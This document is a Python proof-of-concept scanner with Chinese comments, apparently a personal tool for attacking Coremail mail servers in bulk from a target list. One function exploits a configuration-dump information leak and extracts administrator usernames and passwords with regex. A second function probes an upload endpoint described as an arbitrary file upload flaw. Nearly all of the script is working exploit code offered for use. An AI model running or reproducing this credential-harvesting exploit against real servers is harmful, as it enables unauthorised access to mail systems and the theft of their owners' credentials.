import re
import requests
import time
import sys
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告

#本人LOGO
def title():
    print('+------------------------------------------')
    print('+  \033[34mGithub :                                  \033[0m')
    print('+  \033[34m公众号 : 求知鱼（还没开通）                                                     \033[0m')
    print('+  \033[34mVersion: Coremail邮件系统-具体版本暂时未知，后续漏洞继续补充                  \033[0m')
    print('+  \033[36m使用格式: python3 Coremail_poc.py                        \033[0m')
    print('+  \033[36m 1.txt中存放目标 同一文件夹下  目标格式：http://xxx.xxx.xxx.xxx                           \033[0m')
    print('+------------------------------------------')

#第一个漏洞检测：信息泄露 Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞
def poc0(url):
    target = url+"/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url=target,verify=False,timeout=8)
    print('-'*50)
    if r.status_code==200 and "S_OK" in r.text:
        print(url+"    "+"\033[1;35m 漏洞存在 \033[0m!")
        a = str(r.text)
        match = re.findall(r'<string name="Password">(.*?)</string>',a,re.I|re.M)
        match1 = re.findall(r'<string name="User">(.*?)</string>',a,re.I|re.M)
        if match1:
            print("账号为："+match1[1])
        else:
            print("账号未找到")
        if match:
            print("密码为："+match[6])
        else:
            print("密码未找到")
    else:
        print(url+"    "+"漏洞不存在！")
    # print("poc0完成\n")
#第二个漏洞检测：任意文件上传
def poc1(url):
    target = url + "/webinst/action.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.get(url=target, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/webinst/action.jsp \033[0m".format(url))
        if  r.status_code == 200:
            print("存在漏洞")
            print("\033[32m[o] 响应为:\n{} \033[0m".format(r.text))
        else:
            print("不存在漏洞")

    except Exception as e:
            print("请求失败", e)
    # print("poc1完成\n")
#第3个漏洞检测：不太确定 先不写了
if __name__ == '__main__':
    title()
    filelist = open('1.txt', 'r')
    target_list = filelist.readlines()
    all_url = len(target_list)
    for each in target_list:
        urllist = each.rstrip()
        print(urllist)
        try:
            poc0(urllist)
            time.sleep(0.5)
            poc1(urllist)
            time.sleep(0.5)
        except:
            continue




